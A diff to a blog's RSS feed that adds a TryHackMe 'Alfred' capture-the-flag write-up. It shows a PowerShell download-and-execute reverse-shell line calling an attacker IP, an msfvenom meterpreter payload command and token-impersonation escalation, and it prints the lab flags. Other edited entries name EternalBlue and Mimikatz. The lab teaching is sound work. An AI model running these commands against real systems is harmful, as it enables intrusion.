@@ -12,6 +12,114 @@
     <lastBuildDate>Fri, 15 Nov 2024 15:30:00 +0000</lastBuildDate>
     <atom:link href="https://gtello.github.io/writeups/index.xml" rel="self" type="application/rss+xml" />
     <item>
+      <title>Alfred (THM)</title>
+      <link>https://gtello.github.io/writeups/alfred/</link>
+      <pubDate>Fri, 15 Nov 2024 15:30:00 +0000</pubDate><author>gabrieltello10@hotmail.com (Gabriel Tello)</author>
+      <guid>https://gtello.github.io/writeups/alfred/</guid>
+      <description>&lt;div style=&#34;text-align: justify;&#34;&gt;&#xD;&#xA;&lt;p&gt;Here&amp;rsquo;s the writeup for the &lt;a href=&#34;https://tryhackme.com/r/room/alfred&#34;&gt;Alfred&lt;/a&gt; room on TryHackMe.&lt;/p&gt;&#xA;&lt;h2 id=&#34;summary&#34;&gt;Summary&lt;/h2&gt;&#xA;&lt;p&gt;Let&amp;rsquo;s explore how we can exploit this Windows machine with an exposed Jenkins service. Using default credentials, we managed to execute remote commands through Jenkins’ build functionality and gained an initial foothold. From there, we escalated privileges using token impersonation techniques, eventually achieving full administrative control of the system.&lt;/p&gt;&#xA;&lt;h2 id=&#34;reconnaissance&#34;&gt;Reconnaissance&lt;/h2&gt;&#xA;&lt;p&gt;I started with a simple &lt;code&gt;nmap&lt;/code&gt; scan to find open ports and services running on the target.&lt;/p&gt;</description>
+      <content:encoded><![CDATA[<div style="text-align: justify;">
+<p>Here&rsquo;s the writeup for the <a href="https://tryhackme.com/r/room/alfred">Alfred</a> room on TryHackMe.</p>
+<h2 id="summary">Summary</h2>
+<p>Let&rsquo;s explore how we can exploit this Windows machine with an exposed Jenkins service. Using default credentials, we managed to execute remote commands through Jenkins’ build functionality and gained an initial foothold. From there, we escalated privileges using token impersonation techniques, eventually achieving full administrative control of the system.</p>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<p>I started with a simple <code>nmap</code> scan to find open ports and services running on the target.</p>
+<h3 id="reconnaissance-results">Reconnaissance Results</h3>
+<table>
+  <thead>
+      <tr>
+          <th>Operating System</th>
+          <th>IP Address</th>
+          <th>Open Ports</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>Windows Server</td>
+          <td>10.10.149.26</td>
+          <td>80, 3389, 8080</td>
+      </tr>
+  </tbody>
+</table>
+<p><img alt="nmap command and results" src="/images/posts/alfred/image1.png"></p>
+<center><b>nmap command and results</b></center>
+<p>Ports 80 and 8080 caught my attention. Popping open a browser, I checked them out. Port 8080 led me to a Jenkins login page, a tool often used for CI/CD.</p>
+<h2 id="exploitation">Exploitation</h2>
+<p>Now the fun part! First, I tried some default credentials (<code>admin:admin</code>) and got lucky—they worked! That gave me full access to the Jenkins dashboard.</p>
+<p><img alt="Jenkins Dashboard" src="/images/posts/alfred/image2.png"></p>
+<center><b>Jenkins Dashboard</b></center>
+<p>From there, I headed into the project configuration and used the &ldquo;Build&rdquo; section to execute commands. To get a shell, I used a <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1">PowerShell script</a> for a reverse connection:</p>
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="ln">1</span><span class="cl"><span class="nb">iex </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="py">DownloadString</span><span class="p">(</span><span class="s1">&#39;http://10.6.5.62:8008/Invoke-PowerShellTcp.ps1&#39;</span><span class="p">);</span> <span class="nb">Invoke-PowerShellTcp</span> <span class="n">-Reverse</span> <span class="n">-IPAddress</span> <span class="mf">10.6</span><span class="p">.</span><span class="py">5</span><span class="p">.</span><span class="py">62</span> <span class="n">-Port</span> <span class="mf">4321</span></span></span></code></pre></div><p>After hitting <strong>Build Now</strong>, I got a connection back to my attacker machine. Reverse shell achieved!</p>
+<p><img alt="Reverse shell command in Jenkins" src="/images/posts/alfred/image3.png"></p>
+<center><b>Reverse shell command in Jenkins</b></center>  
+<p><img alt="Access via reverse shell" src="/images/posts/alfred/image4.png"></p>
+<center><b>Access via reverse shell</b></center>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>With the initial access sorted out, it was time to go higher. I created a payload for <code>meterpreter</code> using <code>msfvenom</code>:</p>
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln">1</span><span class="cl">msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai <span class="nv">LHOST</span><span class="o">=</span>10.6.5.62 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -f exe -o revshell.exe</span></span></code></pre></div><p>Using <code>certutil</code>, I transferred the payload to the target machine and executed it. This gives us a <code>meterpreter</code> session, making escalation easier.</p>
+<p><img alt="Metasploit listener setup" src="/images/posts/alfred/image5.png"></p>
+<center><b>Metasploit listener setup</b></center>
+<p>Checking the user privileges, we&rsquo;ll spot two key permissions: <code>SeDebugPrivilege</code> and <code>SeImpersonatePrivilege</code>. These let me impersonate tokens for processes with higher permissions. Using the <code>incognito</code> module in Metasploit, I exploited this to escalate privileges.</p>
+<p><img alt="Using the incognito module" src="/images/posts/alfred/image6.png"></p>
+<center><b>Using the incognito module</b></center>
+<p>Finally, I migrated to a process with <code>SYSTEM</code> permissions, giving me full control over the machine.</p>
+<p><img alt="Migrating to a privileged process" src="/images/posts/alfred/image7.png"></p>
+<center><b>Migrating to a privileged process</b></center>
+<h2 id="flags">Flags</h2>
+<p>Once I had admin-level access, finding the flags was straightforward:</p>
+<ul>
+<li><strong>user.txt</strong>: <code>79007a09481963edf2e1321abd9ae2a0</code></li>
+<li><strong>root.txt</strong>: <code>dff0f748678f280250f25a45b8046b4a</code></li>
+</ul>
+<h2 id="tools-used">Tools Used</h2>
+<table>
+  <thead>
+      <tr>
+          <th>Tool</th>
+          <th>What it Did</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><strong>nmap</strong></td>
+          <td>Scanned the network and identified open services.</td>
+      </tr>
+      <tr>
+          <td><strong>Jenkins</strong></td>
+          <td>Exploited using default credentials to execute commands.</td>
+      </tr>
+      <tr>
+          <td><strong>msfvenom/metasploit</strong></td>
+          <td>Generated payloads and escalated privileges with the incognito module.</td>
+      </tr>
+      <tr>
+          <td><strong>certutil</strong></td>
+          <td>Transferred the payload to the target machine.</td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="conclusion">Conclusion</h2>
+<p>This box had a couple of big security issues: an exposed service with default credentials and poorly configured privileges. With these vulnerabilities, escalating to admin was almost too easy.</p>
+<h2 id="recommendations">Recommendations</h2>
+<ul>
+<li><strong>Update Jenkins</strong> and always remove default credentials.</li>
+<li>Set up a <strong>firewall</strong> to restrict unnecessary access.</li>
+<li>Use <strong>strong password policies</strong> and regularly update them.</li>
+<li>Limit user privileges to only what’s necessary.</li>
+</ul>
+</div>
+]]></content:encoded>
+    </item>
+    <item>
       <title>Game Zone (THM)</title>
       <link>https://gtello.github.io/writeups/gamezone/</link>
       <pubDate>Thu, 14 Nov 2024 20:43:00 +0000</pubDate><author>gabrieltello10@hotmail.com (Gabriel Tello)</author>
@@ -28,16 +136,16 @@
 <table>
   <thead>
       <tr>
-          <th style="text-align: left">Operating System</th>
-          <th style="text-align: left">IP Address</th>
-          <th style="text-align: left">Open Ports</th>
+          <th>Operating System</th>
+          <th>IP Address</th>
+          <th>Open Ports</th>
       </tr>
   </thead>
   <tbody>
       <tr>
-          <td style="text-align: left">Ubuntu 16.04.6</td>
-          <td style="text-align: left">10.10.254.53</td>
-          <td style="text-align: left">22 (SSH), 80 (HTTP)</td>
+          <td>Ubuntu 16.04.6</td>
+          <td>10.10.254.53</td>
+          <td>22 (SSH), 80 (HTTP)</td>
       </tr>
   </tbody>
 </table>
@@ -69,30 +177,30 @@
 <table>
   <thead>
       <tr>
-          <th style="text-align: left">Tool</th>
-          <th style="text-align: left">Description</th>
+          <th>Tool</th>
+          <th>Description</th>
       </tr>
   </thead>
   <tbody>
       <tr>
-          <td style="text-align: left"><strong>nmap</strong></td>
-          <td style="text-align: left">Network scanning and open port detection.</td>
+          <td><strong>nmap</strong></td>
+          <td>Network scanning and open port detection.</td>
       </tr>
       <tr>
-          <td style="text-align: left"><strong>Burp Suite</strong></td>
-          <td style="text-align: left">Capturing and analyzing HTTP requests for SQLi.</td>
+          <td><strong>Burp Suite</strong></td>
+          <td>Capturing and analyzing HTTP requests for SQLi.</td>
       </tr>
       <tr>
-          <td style="text-align: left"><strong>sqlmap</strong></td>
-          <td style="text-align: left">SQLi testing and data extraction from the database.</td>
+          <td><strong>sqlmap</strong></td>
+          <td>SQLi testing and data extraction from the database.</td>
       </tr>
       <tr>
-          <td style="text-align: left"><strong>John the Ripper</strong></td>
-          <td style="text-align: left">Used to crack the user <code>agent47</code> password hash for SSH access.</td>
+          <td><strong>John the Ripper</strong></td>
+          <td>Used to crack the user <code>agent47</code> password hash for SSH access.</td>
       </tr>
       <tr>
-          <td style="text-align: left"><strong>Exploit CVE-2012-2982</strong></td>
-          <td style="text-align: left">Webmin vulnerability enabling root access.</td>
+          <td><strong>Exploit CVE-2012-2982</strong></td>
+          <td>Webmin vulnerability enabling root access.</td>
       </tr>
   </tbody>
 </table>
@@ -124,16 +232,16 @@
 <table>
   <thead>
       <tr>
-          <th style="text-align: left">Operating System</th>
-          <th style="text-align: left">IP Address</th>
-          <th style="text-align: left">Open Ports</th>
+          <th>Operating System</th>
+          <th>IP Address</th>
+          <th>Open Ports</th>
       </tr>
   </thead>
   <tbody>
       <tr>
-          <td style="text-align: left">Windows Server 2008</td>
-          <td style="text-align: left">10.10.128.109</td>
-          <td style="text-align: left">80 (HTTP), 135 (RPC), 139 (NetBIOS), 445 (SMB), 3389 (RDP), 5985 (WinRM HTTP), 8080 (HTTP-Alternate), 47001 (WinRM HTTPS), and 49152-49164 (Dynamic RPC range)</td>
+          <td>Windows Server 2008</td>
+          <td>10.10.128.109</td>
+          <td>80 (HTTP), 135 (RPC), 139 (NetBIOS), 445 (SMB), 3389 (RDP), 5985 (WinRM HTTP), 8080 (HTTP-Alternate), 47001 (WinRM HTTPS), and 49152-49164 (Dynamic RPC range)</td>
       </tr>
   </tbody>
 </table>
@@ -170,26 +278,26 @@
 <table>
   <thead>
       <tr>
-          <th style="text-align: left">Tool</th>
-          <th style="text-align: left">Description</th>
+          <th>Tool</th>
+          <th>Description</th>
       </tr>
   </thead>
   <tbody>
       <tr>
-          <td style="text-align: left">nmap</td>
-          <td style="text-align: left">For initial reconnaissance and detection of open ports and services.</td>
+          <td>nmap</td>
+          <td>For initial reconnaissance and detection of open ports and services.</td>
       </tr>
       <tr>
-          <td style="text-align: left">metasploit</td>
-          <td style="text-align: left">To launch the exploit against the Rejetto HTTP server.</td>
+          <td>metasploit</td>
+          <td>To launch the exploit against the Rejetto HTTP server.</td>
       </tr>
       <tr>
-          <td style="text-align: left">PowerUp.ps1</td>
-          <td style="text-align: left">PowerShell script for analyzing privilege configurations on Windows systems.</td>
+          <td>PowerUp.ps1</td>
+          <td>PowerShell script for analyzing privilege configurations on Windows systems.</td>
       </tr>
       <tr>
-          <td style="text-align: left">msfvenom</td>
-          <td style="text-align: left">To generate the reverse shell payload used to obtain administrator permissions.</td>
+          <td>msfvenom</td>
+          <td>To generate the reverse shell payload used to obtain administrator permissions.</td>
       </tr>
   </tbody>
 </table>
@@ -224,16 +332,16 @@ This is a step-by-step guide presented in a professional report format covering 
 <table>
   <thead>
       <tr>
-          <th style="text-align: left">Operating System</th>
-          <th style="text-align: left">IP Address</th>
-          <th style="text-align: left">Open Ports</th>
+          <th>Operating System</th>
+          <th>IP Address</th>
+          <th>Open Ports</th>
       </tr>
   </thead>
   <tbody>
       <tr>
-          <td style="text-align: left">Debian</td>
-          <td style="text-align: left">192.168.138.132</td>
-          <td style="text-align: left">22 (SSH), 80 (HTTP), 111 (RPCbind), 2049 (NFS), 8080 (HTTP Alternate)</td>
+          <td>Debian</td>
+          <td>192.168.138.132</td>
+          <td>22 (SSH), 80 (HTTP), 111 (RPCbind), 2049 (NFS), 8080 (HTTP Alternate)</td>
       </tr>
   </tbody>
 </table>
@@ -278,26 +386,26 @@ This is a step-by-step guide presented in a professional report format covering 
 <table>
   <thead>
       <tr>
-          <th style="text-align: left">Tool</th>
-          <th style="text-align: left">Description</th>
+          <th>Tool</th>
+          <th>Description</th>
       </tr>
   </thead>
   <tbody>
       <tr>
-          <td style="text-align: left">nmap</td>
-          <td style="text-align: left">Used for network scanning and detecting open ports and services on the target machine.</td>
+          <td>nmap</td>
+          <td>Used for network scanning and detecting open ports and services on the target machine.</td>
       </tr>
       <tr>
-          <td style="text-align: left">fcrackzip</td>
-          <td style="text-align: left">Tool used to perform a brute-force attack on zip files.</td>
+          <td>fcrackzip</td>
+          <td>Tool used to perform a brute-force attack on zip files.</td>
       </tr>
       <tr>
-          <td style="text-align: left">wfuzz</td>
-          <td style="text-align: left">Used for brute-forcing web directories, discovering sensitive paths.</td>
+          <td>wfuzz</td>
+          <td>Used for brute-forcing web directories, discovering sensitive paths.</td>
       </tr>
       <tr>
-          <td style="text-align: left">GTFObins</td>
-          <td style="text-align: left">Online resource that provided the method for privilege escalation using the <code>zip</code> binary with sudo permissions.</td>
+          <td>GTFObins</td>
+          <td>Online resource that provided the method for privilege escalation using the <code>zip</code> binary with sudo permissions.</td>
       </tr>
   </tbody>
 </table>
@@ -328,16 +436,16 @@ This is a step-by-step guide presented in a professional report format on a pene
 <table>
   <thead>
       <tr>
-          <th style="text-align: left">Operating System</th>
-          <th style="text-align: left">IP Address</th>
-          <th style="text-align: left">Open Ports</th>
+          <th>Operating System</th>
+          <th>IP Address</th>
+          <th>Open Ports</th>
       </tr>
   </thead>
   <tbody>
       <tr>
-          <td style="text-align: left">Debian 10</td>
-          <td style="text-align: left">192.168.138.128</td>
-          <td style="text-align: left">21 (FTP), 22 (SSH), 80 (HTTP)</td>
+          <td>Debian 10</td>
+          <td>192.168.138.128</td>
+          <td>21 (FTP), 22 (SSH), 80 (HTTP)</td>
       </tr>
   </tbody>
 </table>
@@ -414,30 +522,30 @@ This is a step-by-step guide presented in a professional report format on a pene
 <table>
   <thead>
       <tr>
-          <th style="text-align: left">Tool</th>
-          <th style="text-align: left">Description</th>
+          <th>Tool</th>
+          <th>Description</th>
       </tr>
   </thead>
   <tbody>
       <tr>
-          <td style="text-align: left">Nmap</td>
-          <td style="text-align: left">Used for network scanning and detection of open ports and services on the target machine.</td>
+          <td>Nmap</td>
+          <td>Used for network scanning and detection of open ports and services on the target machine.</td>
       </tr>
       <tr>
-          <td style="text-align: left">hashcat</td>
-          <td style="text-align: left">Used to crack the MD5 hash obtained from the FTP server.</td>
+          <td>hashcat</td>
+          <td>Used to crack the MD5 hash obtained from the FTP server.</td>
       </tr>
       <tr>
-          <td style="text-align: left">wfuzz</td>
-          <td style="text-align: left">Used for brute-forcing web directories, discovering sensitive paths.</td>
+          <td>wfuzz</td>
+          <td>Used for brute-forcing web directories, discovering sensitive paths.</td>
       </tr>
       <tr>
-          <td style="text-align: left">pspy</td>
-          <td style="text-align: left">Program used to monitor processes on Linux without needing root permissions.</td>
+          <td>pspy</td>
+          <td>Program used to monitor processes on Linux without needing root permissions.</td>
       </tr>
       <tr>
-          <td style="text-align: left">LinPEAS</td>
-          <td style="text-align: left">Script used to identify potential privilege escalation paths on the server.</td>
+          <td>LinPEAS</td>
+          <td>Script used to identify potential privilege escalation paths on the server.</td>
       </tr>
   </tbody>
 </table>
@@ -469,16 +577,16 @@ This is a step-by-step guide presented in a professional report format about a p
 <table>
   <thead>
       <tr>
-          <th style="text-align: left">Operating System</th>
-          <th style="text-align: left">IP Address</th>
-          <th style="text-align: left">Open Ports</th>
+          <th>Operating System</th>
+          <th>IP Address</th>
+          <th>Open Ports</th>
       </tr>
   </thead>
   <tbody>
       <tr>
-          <td style="text-align: left">Windows 7 x64 SP 1</td>
-          <td style="text-align: left">192.168.1.167</td>
-          <td style="text-align: left">135, 139, 445, 49152-49158</td>
+          <td>Windows 7 x64 SP 1</td>
+          <td>192.168.1.167</td>
+          <td>135, 139, 445, 49152-49158</td>
       </tr>
   </tbody>
 </table>
@@ -564,18 +672,18 @@ In this case, a persistence script was configured using the <code>windows/local/
 <table>
   <thead>
       <tr>
-          <th style="text-align: left">Flag</th>
-          <th style="text-align: left">Hash</th>
+          <th>Flag</th>
+          <th>Hash</th>
       </tr>
   </thead>
   <tbody>
       <tr>
-          <td style="text-align: left">flag1.txt</td>
-          <td style="text-align: left">0ef3b7d488b11e3e800f547a0765da8e</td>
+          <td>flag1.txt</td>
+          <td>0ef3b7d488b11e3e800f547a0765da8e</td>
       </tr>
       <tr>
-          <td style="text-align: left">flag2.txt</td>
-          <td style="text-align: left">a63c1c39c0c7fd570053343451667939</td>
+          <td>flag2.txt</td>
+          <td>a63c1c39c0c7fd570053343451667939</td>
       </tr>
   </tbody>
 </table>
@@ -583,30 +691,30 @@ In this case, a persistence script was configured using the <code>windows/local/
 <table>
   <thead>
       <tr>
-          <th style="text-align: left">Tool</th>
-          <th style="text-align: left">Description</th>
+          <th>Tool</th>
+          <th>Description</th>
       </tr>
   </thead>
   <tbody>
       <tr>
-          <td style="text-align: left">Nmap</td>
-          <td style="text-align: left">Used for the initial system scan and to identify open ports and services on the target.</td>
+          <td>Nmap</td>
+          <td>Used for the initial system scan and to identify open ports and services on the target.</td>
       </tr>
       <tr>
-          <td style="text-align: left">Metasploit</td>
-          <td style="text-align: left">Used to exploit the EternalBlue vulnerability (CVE-2017-0144) with a reverse shell payload.</td>
+          <td>Metasploit</td>
+          <td>Used to exploit the EternalBlue vulnerability (CVE-2017-0144) with a reverse shell payload.</td>
       </tr>
       <tr>
-          <td style="text-align: left">Mimikatz/kiwi</td>
-          <td style="text-align: left">Used within Meterpreter to extract Windows system credential hashes.</td>
+          <td>Mimikatz/kiwi</td>
+          <td>Used within Meterpreter to extract Windows system credential hashes.</td>
       </tr>
       <tr>
-          <td style="text-align: left">CrackMapExec and PTH</td>
-          <td style="text-align: left">Allowed lateral movement in the machine without needing plaintext passwords, using only hashes.</td>
+          <td>CrackMapExec and PTH</td>
+          <td>Allowed lateral movement in the machine without needing plaintext passwords, using only hashes.</td>
       </tr>
       <tr>
-          <td style="text-align: left">Persistence with Metasploit</td>
-          <td style="text-align: left">Persistence configuration using the windows/local/persistence_service module to ensure continuous access.</td>
+          <td>Persistence with Metasploit</td>
+          <td>Persistence configuration using the windows/local/persistence_service module to ensure continuous access.</td>
       </tr>
   </tbody>
 </table>
